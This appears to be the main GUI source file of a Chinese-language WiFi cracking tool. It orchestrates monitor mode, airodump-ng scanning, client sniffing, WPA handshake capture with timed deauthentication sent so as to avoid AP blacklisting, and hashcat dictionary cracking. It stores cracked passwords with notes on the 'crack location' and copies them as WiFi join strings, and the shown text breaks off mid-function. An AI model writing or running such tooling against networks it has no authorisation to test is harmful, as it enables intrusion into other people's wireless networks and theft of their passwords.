#!/usr/bin/env python3
import sys
import os
import datetime
import io
import threading
import re
import time
import shutil
import subprocess
import csv as csvmod
from pathlib import Path
from typing import Optional
from PyQt5.QtWidgets import (QApplication, QMessageBox, QTableWidgetItem,
                             QFileDialog, QInputDialog, QTreeWidgetItem,
                             QMenu)
from PyQt5.QtCore import QThread, pyqtSignal, QTimer, QEventLoop, Qt, QUrl
from PyQt5.QtGui import QFont, QColor, QDesktopServices

from ui.main_ui import MainUI, WordListDialog, CrackSettingsDialog, CrackResultWidget
from core.aircore import AirCore, today_str

# 停不掉的 QThread 保活集合: 丢弃引用会触发 abort, 见 _stop_threads
_KEEP_ALIVE = set()


class CmdThread(QThread):
    line_out = pyqtSignal(str)
    done = pyqtSignal()
    exited = pyqtSignal(int)

    # 每秒最多往 GUI 送多少行: 超出的丢弃并在下一秒补一条汇总。
    # airodump-ng 在 stdout 非终端时会以约 22 万行/秒刷全屏(实测 12MB/s),
    # 若每行都发一个信号, 事件队列和内存会一起爆炸 —— 这就是"一扫描就卡死、
    # 15 秒倒计时只走 1 秒"的根因。
    MAX_LINES_PER_SEC = 60

    # 全屏重绘的特征序列。正常报错行里不会出现, 一旦命中就认为该进程之后
    # 的输出全是画面内容, 整块丢弃(代价接近零), 只需继续读以免管道背压。
    _DRAW_MARKERS = (b"\x1b[2J", b"\x1b[0K", b"\x1b[?25l", b"\x1b[2;1H")

    def __init__(self, proc):
        super().__init__()
        self.proc = proc
        self._stop = False
        self.returncode = -1

    def run(self):
        try:
            if not self.proc or not self.proc.stdout:
                return
            self._pump(self.proc.stdout)
            self.proc.wait()
            self.returncode = self.proc.returncode
        except (OSError, ValueError) as e:
            print(f"[CmdThread] {e}")
        finally:
            self.exited.emit(self.returncode)
            self.done.emit()

    def _pump(self, stream):
        """按字节读取子进程输出, 只把"人看得懂的行"限流后交给 GUI。

        直接 `for line in stream` 会经过 TextIOWrapper 的行缓冲, 整屏 ANSI
        重绘仍会变成几十万个信号; 这里绕开文本层自己分块, 顺带识别并丢弃
        重绘输出, 再做每秒限流。"""
        raw = getattr(stream, "buffer", None)
        if raw is None and hasattr(stream, "read1"):
            raw = stream  # 测试桩/无文本层的原始流
        read_chunk = getattr(raw, "read1", None) if raw is not None else None
        if read_chunk is None:
            # 无字节层或只有 read(n)(会一直等到读满为止): 退化为按行读
            for line in stream:
                if self._stop:
                    break
                if isinstance(line, bytes):
                    line = line.decode("utf-8", "replace")
                self._send(line.rstrip("\r\n"))
            return

        pending = b""
        drawing = False
        state = {"t": time.monotonic(), "sent": 0, "dropped": 0}

        def tick(force=False):
            """每秒结算一次限流窗口, 有被丢掉的行就补一条汇总说明。"""
            now = time.monotonic()
            if force or now - state["t"] >= 1.0:
                if state["dropped"]:
                    self._send(f"[输出] 已过滤 {state['dropped']} 行界面刷新噪音")
                state["t"] = now
                state["sent"] = 0
                state["dropped"] = 0

        def push(line: bytes):
            if state["sent"] >= CmdThread.MAX_LINES_PER_SEC:
                state["dropped"] += 1
                return
            state["sent"] += 1
            self._send(line.decode("utf-8", "replace").rstrip("\r"))

        while not self._stop:
            tick()
            try:
                chunk = read_chunk(65536)
            except (OSError, ValueError):
                break
            if not chunk:
                break
            if drawing:
                continue
            if any(m in chunk for m in self._DRAW_MARKERS):
                drawing = True
                continue
            pending += chunk
            if b"\n" in pending:
                parts = pending.split(b"\n")
                pending = parts.pop()
                for line in parts:
                    if self._stop:
                        return
                    tick()
                    push(line)
        tick(force=True)

    def _send(self, text: str):
        if text:
            self.line_out.emit(text)

    def stop(self):
        self._stop = True
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=2)
            except (OSError, subprocess.TimeoutExpired, ValueError):
                pass


class FuncThread(QThread):
    done = pyqtSignal(object)

    def __init__(self, fn):
        super().__init__()
        self._fn = fn

    def run(self):
        try:
            self.done.emit(self._fn())
        except Exception as e:  # noqa: BLE001 - 线程边界必须兜底
            print(f"[FuncThread] {e}")
            self.done.emit(None)


class EasyAirApp(MainUI):
    def __init__(self):
        super().__init__()
        # 打包后必须用稳定目录, 否则配置/历史会随临时目录一起消失
        self.core = AirCore()
        self.scan_thread = None
        self.cap_thread = None
        # 独立客户端嗅探(tcpdump data 帧): airodump 的 Station 段在本机
        # 监听接口上长期只写 "(not associated)", 客户端列永远为 0 ——
        # 用嗅探兜底, {BSSID: {client_mac}}。引用计数, 扫描/抓包共享。
        self._sniffer_thread = None
        self._sniffer_users = set()
        self._sniffed_clients = {}
        self._sniff_noticed = False
        self.crack_thread = None
        self.conv_thread = None
        self.mon_thread = None
        self.mon_iface = None
        self.physical_iface = None
        self._last_csv = None
        # 上一次写入表格的行数据: 内容没变就不重建表格
        self._last_rows = None
        self.auto_monitor_enabled = self.core.config.get("auto_monitor", True)
        self.scan_auto_stop = int(self.core.config.get("scan_auto_stop", 0) or 0)

        self.scan_timer = QTimer(self)
        self.scan_timer.timeout.connect(self._parse_scan_csv)
        self.scan_timer.setInterval(1500)
        # 倒计时/时长用独立的高频定时器: 解析 CSV 可能因文件被写占用
        # 而变慢甚至卡住, 倒计时不能跟着一起停(看起来就是"倒计时不连续")
        self.tick_timer = QTimer(self)
        self.tick_timer.timeout.connect(self._tick_scan_clock)
        self.tick_timer.setInterval(200)
        # 未扫描时必须为 0: 之前用 time.time() 会让"扫描时长"显示成
        # 几万小时, 且 -1 未知信号判断等判断全部失效
        self.scan_start_time = 0.0
        self.scan_deadline = None
        self._cd_anchor_left = 0
        self._last_clock_text = ""
        self._refreshing_caps = False
        self._stopping_scan = False
        self._crack_running = False
        self._capture_running = False
        self._scan_warned = False
        self.scan_returncode = None
        self._client_tips = {}
        self._ap_clients = {}
        self._checking_handshake = False
        self._handshake_found = False
        self._hs_last = None
        self._deauth_attempts = 0
        self._auto_mode = False
        self._auto_queue = []
        self._auto_total = 0
        self._auto_done = 0
        self._auto_ok = 0
        self._auto_deadline = None

        # 破解相关状态
        self.current_crack_item = None
        self.current_crack_date = today_str()
        self.crack_start_time = 0
        self.crack_timer = QTimer(self)
        self.crack_timer.timeout.connect(self._update_crack_timer)
        self.crack_timer.setInterval(1000)
        self._worker = None
        self._workers = set()
        self._threads = set()
        self._last_persist = 0.0

        # 跨线程日志的唯一出口: Qt 自动连接在跨线程时就是 queued,
        # 因此 appendPlainText 永远只在 GUI 线程跑。
        self._log_line.connect(self._append_log)

        self._bind()
        self._load_wordlists()
        self._refresh_ifaces()
        self._refresh_engine_label()
        self._load_history_tabs()
        self._refresh_cap_tree()

        # 后台清掉上次异常退出遗留的扫描进程, 顺带探测 airodump 的
        # --background 支持(一次, 之后都是缓存结果)
        threading.Thread(target=self._cleanup_stale_scans, daemon=True).start()
        threading.Thread(target=self.core.supports_background_probe,
                         daemon=True).start()

    def closeEvent(self, event):
        """退出必须快速返回。

        原来这里同步跑 stop_monitor(含 sudo 校验, 最长 10s) 并逐个
        wait(2000) 等线程, 会让窗口长时间"未响应"甚至被强杀。
        现在: 先停子进程(有界等待), 监听接口交给后台线程收尾,
        残留的 mon 接口下次启动时 _cleanup_monitor 会清理。"""
        self.tick_timer.stop()
        self.scan_timer.stop()
        try:
            self._persist_record()
        except Exception as e:  # noqa: BLE001
            print(f"[退出] 保存进度失败: {e}")

        mon = self.mon_iface
        self.mon_iface = None
        self._stop_threads()

        if mon:
            def _cleanup(m=mon):
                try:
                    self.core.stop_monitor(m)
                except Exception as e:  # noqa: BLE001
                    print(f"[退出] 关闭监听失败: {e}")

            t = threading.Thread(target=_cleanup, daemon=True)
            t.start()
            _KEEP_ALIVE.add(t)

        super().closeEvent(event)

    def _bind(self):
        # 网卡
        self.btn_refresh_iface.clicked.connect(self._refresh_ifaces)

        # 监听模式按钮（手动切换）
        self.btn_mon_toggle.toggled.connect(self._on_mon_toggle)

        # 扫描/抓包
        self.btn_scan.clicked.connect(self._toggle_scan)
        self.btn_capture.clicked.connect(self._toggle_capture)
        self.btn_auto_cap.clicked.connect(self._toggle_auto_capture)

        # 字典管理
        self.btn_dict_mgr.clicked.connect(self._open_dict_manager)

        # 破解设置
        self.btn_crack_cfg.clicked.connect(self._open_crack_settings)

        # 破解控制
        self.btn_start_crack.clicked.connect(self._toggle_crack)
        self.btn_batch_add.clicked.connect(self._batch_add_to_crack)
        self.btn_cap_add.clicked.connect(self._batch_add_to_crack)
        self.btn_import_cap.clicked.connect(self._import_handshakes)
        self.btn_copy_wifi.clicked.connect(self._copy_wifi_credentials)
        self.cap_tree.customContextMenuRequested.connect(self._cap_menu)
        self.cap_tree.itemChanged.connect(self._on_cap_note_edited)
        self.btn_export.clicked.connect(self._export_results)
        self.btn_note.clicked.connect(self._edit_note)
        self.btn_del_record.clicked.connect(self._delete_record)
        self.log_tabs.currentChanged.connect(lambda _i: None)

        # AP 表格单击/双击选择目标并可开始抓包
        self.ap_table.cellClicked.connect(self._on_ap_clicked)
        self.ap_table.cellDoubleClicked.connect(self._on_ap_double_clicked)

        # 握手包库双击载入
        self.cap_tree.itemDoubleClicked.connect(self._on_cap_double_clicked)
        self.cap_tree.itemSelectionChanged.connect(self._on_cap_selected)

    # ===== 线程管理 =====
    # 所有 QThread 必须由 self._threads 持有引用:
    # 一旦 C++ QThread 在运行中被析构, PyQt 会直接 abort 整个进程
    # ("QThread: Destroyed while thread is still running")
    def _track(self, thread):
        self._threads.add(thread)
        thread.finished.connect(lambda t=thread: self._threads.discard(t))
        return thread

    def _run_worker(self, fn, on_done=None):
        """在后台线程执行阻塞函数。

        不要在此等待上一个 worker: 抓握手包期间用户仍要点 Deauth,
        并发是正常用法; 而 GUI 线程 wait() 会造成最多 5s 的界面假死。
        这里只保留引用防止 QThread 被过早回收(那会触发
        "QThread: Destroyed while thread is still running")。"""
        worker = FuncThread(fn)
        if on_done is not None:
            worker.done.connect(on_done)
        self._worker = worker
        self._workers.add(worker)
        worker.finished.connect(lambda w=worker: self._workers.discard(w))
        self._track(worker)
        worker.start()
        return worker

    def _spawn_cmd(self, proc, on_line=None, on_done=None):
        """为子进程创建输出读取线程, 返回线程对象(不存局部变量!)"""
        t = CmdThread(proc)
        if on_line is not None:
            t.line_out.connect(on_line)
        if on_done is not None:
            t.done.connect(on_done)
        self._track(t)
        t.start()
        return t

    def _stop_threads(self):
        """终止子进程与工作线程。

        注意: 不能在线程仍在运行时丢弃引用 —— QThread 一旦被 GC 就会
        触发 "QThread: Destroyed while thread is still running" 并 abort
        整个进程(表现为界面被强制结束)。停不掉的线程交给模块级集合
        保活到进程退出。"""
        for t in list(self._threads):
            if isinstance(t, CmdThread):
                t.stop()
        for t in list(self._threads):
            try:
                if t.isRunning() and not t.wait(700):
                    _KEEP_ALIVE.add(t)
            except RuntimeError:
                _KEEP_ALIVE.add(t)
        self._threads.clear()
        for w in list(self._workers):
            try:
                if w.isRunning() and not w.wait(700):
                    _KEEP_ALIVE.add(w)
            except RuntimeError:
                _KEEP_ALIVE.add(w)
        self._workers.clear()

    # ===== 日志 =====
    # 扫描多久还没有 AP 就主动诊断(airodump-ng 抓到 0 个 AP 时不会退出)
    _NO_APS_TIMEOUT = 15

    # deauth 重发间隔(毫秒): 30 秒, 留间隔避免被 AP 拉黑
    _DEAUTH_INTERVAL_MS = 30000

    # 真实报错关键词: 命中即绕过噪音过滤, 保证用户能看到失败原因
    _ERROR_KEYWORDS = (
        "not found", "no such file", "permission denied",
        "operation not permitted", "cannot ", "can't ", "failed",
        "error", "unable", "请以 root", "must be root", "denied",
        "unsupported", "not supported", "no devices found",
    )

    # 原始工具输出过滤规则: iw/airmon-ng 的表格、"command failed" 噪音
    _NOISE_PATTERNS = (
        "command failed", "command time out", "no such device",
        "\tInterface\tDriver", "PHY\tInterface", "Chipset",
        "(monitor mode disabled)", "(monitor mode enabled)",
        "nl80211: ", "--- ", "wlan0mon", "set monitor mode",
        "monitor mode for interface", "level 2", "level 3",
    )

    def _should_log(self, txt: str) -> bool:
        """过滤 iw/airmon-ng 原始输出, 但真实报错必须放行。
        顺序: 先按已知噪音表丢弃(这些是 iw 的固定输出, 如
        'command failed: No such device'), 未命中噪音表的报错行
        (如 'permission denied' / 'not found')一律保留。"""
        s = txt.strip()
        if not s:
            return False
        low = s.lower()
        for pat in self._NOISE_PATTERNS:
            if pat.lower() in low:
                return False
        for key in self._ERROR_KEYWORDS:
            if key in low:
                return True
        # 纯表格行(连续制表符)
        if s.count("\t") >= 2:
            return False
        return True

    # 工作线程写日志的唯一入口: 信号是 queued 的, appendPlainText 一定在
    # GUI 线程执行。QPlainTextEdit 不是线程安全的, 跨线程直接调用会让 Qt 报
    # "Cannot queue arguments of type 'QTextBlock'/'QTextCursor'" 并最终段错误。
    _log_line = pyqtSignal(str, object)

    def _append_log(self, kind: str, txt: str):
        box = self.log_crack_box if kind == "crack" else self.log_scan_box
        stamp = datetime.datetime.now().strftime("%H:%M:%S")
        box.appendPlainText(f"[{stamp}] {txt}")

    def log(self, txt: str):
        """抓包/扫描日志 (只收有意义的内容)"""
        if not self._should_log(txt):
            return
        self._log_line.emit("scan", txt)

    def log_scan(self, txt: str):
        """子进程 stdout 入口 (airdump 等), 过滤噪音但保留扫描输出"""
        if self._should_log(txt):
            self._log_line.emit("scan", txt)

    def log_crack(self, txt: str):
        """破解日志"""
        self._log_line.emit("crack", txt)

    def set_status(self, txt: str):
        self.status_label.setText(txt)

    # ===== 网卡 =====
    def _refresh_ifaces(self):
        self.iface_combo.clear()
        for i in self.core.list_interfaces():
            self.iface_combo.addItem(i)
        if self.iface_combo.count() == 0:
            self.log("[提示] 未检测到无线网卡 (iw dev 无输出)")
            self.log("  - 真机: 确认网卡驱动正常")
            self.log("  - 虚拟机: 需将支持监听的 USB 无线网卡直通")

    # ===== 监听模式手动切换 =====
    def _enable_monitor(self) -> bool:
        """同步开启监听模式, 供"选中目标即抓包"这类流程内部调用。

        走工作线程执行 start_monitor, 完成后直接在当前线程继续,
        因此最多等待一次(界面在此期间不刷新)。返回是否成功开启。"""
        physical = self.iface_combo.currentText().strip()
        if not physical:
            self.set_status("请先在顶部选择无线网卡")
            return False
        if self.mon_iface:
            return True

        self.set_monitor_status("starting")
        self.physical_iface = physical
        btn = self.btn_mon_toggle
        # 关键: 这里只同步开关外观, 绝不能让 toggled 信号真的发出去。
        # btn.setChecked(True) 会触发 _on_mon_toggle, 那里同样会调
        # start_monitor —— 于是同一次"开启监听"跑了两遍 airmon-ng,
        # 两个线程同时对同一网卡 stop/start, 轻则日志重复(实际线上就是
        # "[监听模式] 准备开启" 连打两次), 重则 airmon-ng 互相把对方的
        # monitor 接口清掉, 表现为"刚开启就检测不到接口"。
        btn.blockSignals(True)
        btn.setChecked(True)
        btn.blockSignals(False)
        btn.setEnabled(False)

        # start_monitor(airmon-ng + 多次 sudo)与 _detect_mon_iface 都是
        # 阻塞子进程, 最长十几秒。之前直接在 GUI 线程跑, 表现为"选中目标
        # 即抓包"时界面整个冻住。这里放进工作线程, 用嵌套事件循环等结果:
        # 对外仍是同步返回 bool(调用方语义不变), 而这段时间界面照常重绘、
        # 倒计时照常走。
        err = {"kind": "", "msg": ""}

        def _work():
            try:
                p = self.core.start_monitor(physical)
            except PermissionError as e:
                err.update(kind="perm", msg=str(e))
                return None
            except Exception as e:  # noqa: BLE001
                err.update(kind="exc", msg=str(e))
                return None
            if not p:
                err.update(kind="none", msg="")
                return None

            mon = self._detect_mon_iface(physical)
            if not mon:
                # 轮询等待接口出现(airmon-ng 建好接口需要一点时间)
                for _ in range(10):
                    if p.poll() is not None:
                        break
                    time.sleep(0.3)
                    mon = self._detect_mon_iface(physical)
                    if mon:
                        break
            if not mon:
                p.terminate()
                err.update(kind="nomon", msg="")
                return None
            return p, mon

        out = {"v": None}
        loop = QEventLoop()
        worker = FuncThread(_work)

        def _done(v):
            out["v"] = v
            if loop.isRunning():
                loop.quit()

        worker.done.connect(_done)
        self._workers.add(worker)
        worker.finished.connect(lambda w=worker: self._workers.discard(w))
        self._track(worker)
        # 先让事件循环跑起来再启动线程, 否则极快返回时 quit() 会落空
        QTimer.singleShot(0, worker.start)
        QTimer.singleShot(20000, loop.quit)  # 驱动卡死时也不永久挂起
        loop.exec_()
        worker.wait(300)

        if out["v"] is None:
            btn.setEnabled(True)
            self.set_monitor_status("error")
            if err["kind"] == "perm":
                self.set_status("无 root 权限，无法开启监听")
                self.log(f"[监听开启失败] {err['msg']}")
            elif err["kind"] == "exc":
                self.log(f"[监听开启异常] {err['msg']}")
                self.set_status("监听模式开启失败")
            else:
                self.set_status("监听模式开启失败")
            return False

        proc, mon = out["v"]
        self.mon_iface = mon
        self._monitor_proc = proc
        self.set_monitor_status("on")
        btn.setEnabled(False)
        self.log(f"[监听] 已开启: {physical} → {mon}")
        return True

    def _on_mon_toggle(self, checked: bool):
        physical = self.iface_combo.currentText()
        if not physical:
            self.btn_mon_toggle.setChecked(False)
            return

        if checked:
            self.set_monitor_status("starting")
            self.physical_iface = physical
            self.btn_mon_toggle.setEnabled(False)
            self.set_status(f"正在开启监听模式 · {physical}")
            self._run_worker(lambda: self.core.start_monitor(physical),
                             self._on_mon_started)
        else:
            self._stop_monitor_manual()

    def _detect_mon_iface(self, physical: str) -> str:
        """阻塞式检测实际监听接口名（供工作线程调用）"""
        if self.core.check_monitor_mode(physical):
            return physical
        for iface in self.core.list_interfaces():
            if "mon" in iface and physical in iface:
                if self.core.check_monitor_mode(iface):
                    return iface
        return ""

    def _on_mon_started(self, _proc):
        """airmon-ng 已启动，检测实际监听接口（检测也要放线程）"""
        self.btn_mon_toggle.setEnabled(True)
        physical = self.physical_iface
        self._run_worker(lambda: self._detect_mon_iface(physical),
                         self._apply_mon_iface)

    def _apply_mon_iface(self, mon):
        if mon:
            self.mon_iface = mon
            self.log(f"监听模式已就绪 · 接口 {mon}")
            self.set_monitor_status("on")
            self.set_status(f"监听中 · 可直接扫描或抓取握手包")
            return

        self._disarm_scan_clock()
        self.log("监听模式开启失败 · 未检测到 monitor 接口")
        self.set_monitor_status("error")
        self.btn_mon_toggle.setChecked(False)
        self.set_status("监听模式开启失败")

    def _stop_monitor_manual(self):
        if self.mon_iface:
            mon = self.mon_iface
            self.set_monitor_status("starting")
            self.set_status("正在关闭监听模式…")
            self._run_worker(lambda: self.core.stop_monitor(mon),
                             self._on_stop_monitor_proc)

    def _on_stop_monitor_proc(self, p):
        self._spawn_cmd(p, self.log_scan, self._on_mon_stopped)

    def _on_mon_stopped(self):
        self.mon_iface = None
        self.physical_iface = None
        self.set_monitor_status("off")
        self.btn_mon_toggle.setChecked(False)
        self.log("监听模式已关闭")
        self.set_status("监听模式已关闭")

    # ===== 字典管理 =====
    def _load_wordlists(self):
        pass  # 不在主界面显示

    def _open_dict_manager(self):
        dlg = WordListDialog(self, self.core.get_saved_wordlists())
        if dlg.exec_() == WordListDialog.Accepted:
            new_lists = dlg.get_wordlists()
            self.core.config["wordlists"] = new_lists
            self.core.save_config()
            self.log(f"[字典] 已更新，共 {len(new_lists)} 个字典文件")

    def _open_crack_settings(self):
        dlg = CrackSettingsDialog(self, self.core.config)
        if dlg.exec_() != CrackSettingsDialog.Accepted:
            return
        vals = dlg.values()
        self.core.config.update(vals)
        self.core.save_config()
        self.auto_monitor_enabled = vals["auto_monitor"]
        self.scan_auto_stop = vals["scan_auto_stop"]
        self._refresh_engine_label()
        self.log(f"[设置] 引擎={vals['crack_engine']} | 设备={vals['crack_device']}")
        self.log(f"[设置] GPU 温度上限={vals['hashcat_temp_limit'] or '不限制'}")
        self.log(f"[设置] 扫描自动停止="
                 f"{self.scan_auto_stop}s" if self.scan_auto_stop else "[设置] 扫描需手动停止")
        self.set_status("设置已保存")

    def _refresh_engine_label(self):
        engine = self.core.config.get("crack_engine", "Hashcat (GPU/CPU)")
        device = self.core.config.get("crack_device", "GPU + CPU (自动)")
        self.lbl_engine.setText(f"{engine}  |  {device}")

    # ===== 破解结果: 按日期归类 =====
    def _load_history_tabs(self):
        self.result_tabs.blockSignals(True)
        while self.result_tabs.count():
            page = self.result_tabs.widget(0)
            self.result_tabs.removeTab(0)
            page.deleteLater()

        history = self.core.load_history()
        dates = sorted(history.keys(), reverse=True)
        if today_str() not in dates:
            dates.insert(0, today_str())

        for date in dates:
            tree = CrackResultWidget()
            for rec in history.get(date, []):
                tree.load_record(rec)
            n = tree.topLevelItemCount()
            self.result_tabs.addTab(tree, f"{date} ({n})")
            tree.itemSelectionChanged.connect(
                lambda _t=date: self._sync_record_buttons(_t))
        self.result_tabs.blockSignals(False)
        self.current_crack_date = self._tab_date(0) or today_str()

    def _tab_date(self, index=None) -> str:
        idx = self.result_tabs.currentIndex() if index is None else index
        if idx < 0:
            return today_str()
        label = self.result_tabs.tabText(idx)
        return label.split(" (")[0]

    def _current_result_tree(self):
        return self.result_tabs.currentWidget()

    def _cap_menu(self, pos):
        """握手包库右键菜单: 删除 / 清空。"""
        item = self.cap_tree.itemAt(pos)
        # 关键: 右键不会自动改变选中项。之前直接取 selectedItems(), 用户
        # 右键点了某个包但没先左键选中时, 选中集是空的 -> 删除/加入都无反应。
        if item is not None and item not in self.cap_tree.selectedItems():
            self.cap_tree.setCurrentItem(item)
            self.cap_tree.clearSelection()
            item.setSelected(True)
        menu = QMenu(self)
        act_add = menu.addAction("➕ 加入右侧破解")
        act_folder = menu.addAction("📂 打开所在文件夹")
        act_copy = menu.addAction("📋 复制路径")
        act_note = menu.addAction("📝 编辑备注")
        menu.addSeparator()
        act_del = menu.addAction("🗑 删除选中")
        act_clear = menu.addAction("🧹 清空全部")
        chosen = menu.exec_(self.cap_tree.viewport().mapToGlobal(pos))
        if chosen is None:
            return
        if chosen == act_add:
            self._batch_add_to_crack()
            return
        if chosen == act_folder:
            self._open_cap_folder()
            return
        if chosen == act_copy:
            self._copy_cap_path()
            return
        if chosen == act_note:
            if item:
                self.cap_tree.editItem(item, 0)
            return
        if chosen == act_del:
            self._delete_selected_caps()
            return
        if chosen == act_clear:
            self._clear_all_caps()

    def _selected_caps(self) -> list:
        """取选中的握手包文件。

        顶层是"日期"分组, 它的 UserRole 存的是日期字符串(如 2026-10-06),
        直接当路径会导致 unlink 目录报 IsADirectoryError —— 表现就是
        选中日期行后删除无效。因此只取叶子项; 选中日期行则展开成
        该日期下的全部握手包(符合直觉)。"""
        out, seen = [], set()
        for it in self.cap_tree.selectedItems():
            targets = ([it] if it.parent() is not None
                       else [it.child(i) for i in range(it.childCount())])
            for node in targets:
                v = node.data(0, Qt.UserRole)
                if not v:
                    continue
                p = Path(v)
                # 双保险: 必须是真实存在的文件, 不能是日期目录
                if p.is_file() and p not in seen:
                    seen.add(p)
                    out.append(p)
        return out

    def _delete_selected_caps(self):
        caps = self._selected_caps()
        if not caps:
            self.set_status("请先在握手包库中选择要删除的文件")
            return
        if QMessageBox.question(
                self, "删除确认",
                f"确定删除选中的 {len(caps)} 个握手包?\\n删除后无法恢复。",
                QMessageBox.Yes | QMessageBox.No) != QMessageBox.Yes:
            return
        n = 0
        for c in caps:
            try:
                c.unlink(missing_ok=True)
                Path(str(c) + ".note").unlink(missing_ok=True)
                Path(str(c) + ".meta").unlink(missing_ok=True)
                n += 1
            except OSError as e:
                self.log(f"[删除失败] {c.name}: {e}")
        self._refresh_cap_tree()
        self.set_status(f"已删除 {n} 个握手包")

    def _clear_all_caps(self):
        caps = [p for _, p, _ in self.core.list_handshakes()]
        if not caps:
            self.set_status("握手包库已是空的")
            return
        if QMessageBox.question(
                self, "清空确认",
                f"确定清空全部 {len(caps)} 个握手包?\\n删除后无法恢复。",
                QMessageBox.Yes | QMessageBox.No) != QMessageBox.Yes:
            return
        n = 0
        for c in caps:
            try:
                c.unlink(missing_ok=True)
                Path(str(c) + ".note").unlink(missing_ok=True)
                n += 1
            except OSError as e:
                self.log(f"[删除失败] {c.name}: {e}")
        for sub in self.core.caps_dir.glob("20??-??-??"):
            try:
                sub.rmdir()      # 只删空目录
            except OSError:
                pass
        self._refresh_cap_tree()
        self.set_status(f"已清空 {n} 个握手包")

    def _cap_target_dir(self) -> Optional[Path]:
        """右键"打开所在文件夹"要用的目录: 取当前项的父目录。

        子项(握手包)的 UserRole 是文件路径 -> 用其父目录;
        顶层(日期分组)的 UserRole 是日期字符串 -> 用 captures/<日期>。
        """
        item = self.cap_tree.currentItem()
        if item is not None:
            v = item.data(0, Qt.UserRole)
            if v:
                p = Path(v)
                if p.is_file():
                    return p.parent
                if p.is_dir():
                    return p
                dated = self.core.caps_dir / str(v)
                if dated.is_dir():
                    return dated
        return self.core.caps_dir

    def _open_cap_folder(self):
        d = self._cap_target_dir()
        if not d or not d.is_dir():
            self.set_status("未找到握手包所在文件夹")
            return
        QDesktopServices.openUrl(QUrl.fromLocalFile(str(d)))
        self.set_status(f"已打开 {d}")

    def _copy_cap_path(self):
        caps = self._selected_caps()
        if caps:
            text = "\n".join(str(c) for c in caps)
        else:
            d = self._cap_target_dir()
            if not d:
                return
            text = str(d)
        QApplication.clipboard().setText(text)
        self.set_status("路径已复制到剪贴板")
        self.log(f"[复制] 路径: {text}")

    def _batch_add_to_crack(self):
        """把握手包库中选中的多个握手包批量加入右侧列表。"""
        caps = self._selected_caps()
        if not caps:
            QMessageBox.information(
                self, "提示",
                "请先在下方「握手包库」中按住 Ctrl 或 Shift 多选要破解的握手包")
            return
        tree = self._current_result_tree()
        if tree is None:
            QMessageBox.information(self, "提示", "请先打开一个破解结果标签页")
            return
        added = 0
        # 已在列表里的(同路径)不重复加入
        existing = set()
        for i in range(tree.topLevelItemCount()):
            existing.add(tree.topLevelItem(i).text(tree.COL_CAP))
        for cap in caps:
            if str(cap) in existing:
                continue
            meta = self.core.cap_meta(cap)
            # 抓包时没记下信息的老包, 退化成用文件名, 至少列里能看到东西
            essid = meta.get("essid") or cap.stem
            bssid = meta.get("bssid") or "-"
            note = self.core.cap_note(cap)
            tree.add_target(bssid, essid, str(cap), note)
            existing.add(str(cap))
            added += 1
        if not added:
            self.set_status("选中的握手包都已在破解列表里了")
            return
        idx = self.result_tabs.currentIndex()
        if idx >= 0:
            self.result_tabs.setTabText(
                idx, f"{self._tab_date(idx)} ({tree.topLevelItemCount()})")
        self._persist_record()
        self.set_status(f"已批量加入 {added} 个握手包到右侧列表")
        self.log(f"[批量] 已加入 {added} 个握手包")

    def _import_handshakes(self):
        """从外部导入 1 个或多个握手包。

        复制进当天握手包库(便于留存), 校验确含握手后加入右侧破解列表。"""
        files, _ = QFileDialog.getOpenFileNames(
            self, "导入握手包", str(Path.home()),
            "握手包 (*.cap *.pcap *.22000);;所有文件 (*.*)")
        if not files:
            return
        dest_dir = self.core._dated_dir()
        tree = self._current_result_tree()
        existing = set()
        if tree is not None:
            for i in range(tree.topLevelItemCount()):
                existing.add(tree.topLevelItem(i).text(tree.COL_CAP))
        added = bad = 0
        for f in files:
            src = Path(f)
            if not src.is_file():
                continue
            if src.suffix.lower() in (".cap", ".pcap") \
                    and not self.core.has_handshake(src):
                bad += 1
                self.log(f"[导入] {src.name} 未检出握手包，已跳过")
                continue
            dest = dest_dir / src.name
            if dest.exists():
                dest = dest_dir / f"{src.stem}-import{src.suffix}"
            try:
                shutil.copy2(src, dest)
            except OSError as e:
                self.log(f"[导入失败] {src.name}: {e}")
                continue
            if tree is not None and str(dest) not in existing:
                tree.add_target("-", src.stem, str(dest), "")
                existing.add(str(dest))
            added += 1
        self._refresh_cap_tree()
        if tree is not None:
            idx = self.result_tabs.currentIndex()
            if idx >= 0:
                self.result_tabs.setTabText(
                    idx, f"{self._tab_date(idx)} ({tree.topLevelItemCount()})")
            self._persist_record()
        msg = f"已导入 {added} 个握手包" + (f"，跳过 {bad} 个(不含握手)" if bad else "")
        self.set_status(msg)
        self.log(f"[导入] {msg}")

    def _copy_wifi_credentials(self):
        """复制选中记录的 WiFi 名称与密码, 无密码时不可用。"""
        tree = self._current_result_tree()
        item = tree.current_record() if tree else None
        if not item:
            return
        pwd = item.text(CrackResultWidget.COL_PWD)
        essid = item.text(CrackResultWidget.COL_ESSID) or ""
        if not pwd or pwd == "破解中...":
            self.set_status("该记录尚未破解出密码")
            return
        text = f"WIFI:S:{essid};T:WPA;P:{pwd};;"
        QApplication.clipboard().setText(text)
        self.set_status(f"已复制: {essid}")
        self.log(f"[复制] {text}")

    def _sync_record_buttons(self, _date=None):
        tree = self._current_result_tree()
        item = tree.current_record() if tree else None
        has = bool(item)
        self.btn_note.setEnabled(has)
        self.btn_del_record.setEnabled(has)
        # 只有真的破解出密码才允许复制, 否则置灰
        pwd = item.text(CrackResultWidget.COL_PWD) if has else ""
        self.btn_copy_wifi.setEnabled(
            bool(pwd) and pwd != "破解中..." and pwd != "未找到")

    def _reload_current_tab(self):
        date = self._tab_date()
        tree = self._current_result_tree()
        if not tree:
            return
        tree.clear()
        for rec in self.core.history_records(date):
            tree.load_record(rec)
        self.result_tabs.setTabText(
            self.result_tabs.currentIndex(),
            f"{date} ({tree.topLevelItemCount()})")

    def _edit_note(self):
        tree = self._current_result_tree()
        item = tree.current_record() if tree else None
        if not item:
            QMessageBox.information(self, "提示", "请先在结果列表中选择一条记录")
            return
        cur = item.text(CrackResultWidget.COL_NOTE)
        note, ok = QInputDialog.getText(self, "添加备注", "备注 (如破解地点):", text=cur)
        if not ok:
            return
        tree.set_note(item, note.strip())
        date = self._tab_date()
        index = tree.indexOfTopLevelItem(item)
        rec = tree.to_record(item)
        self.core.history_update(date, index, rec)
        self.log(f"[备注] {rec['essid'] or rec['bssid']} -> {rec['note'] or '(空)'}")

    def _delete_record(self):
        tree = self._current_result_tree()
        item = tree.current_record() if tree else None
        if not item:
            return
        rec = tree.to_record(item)
        if QMessageBox.question(
            self, "确认删除",
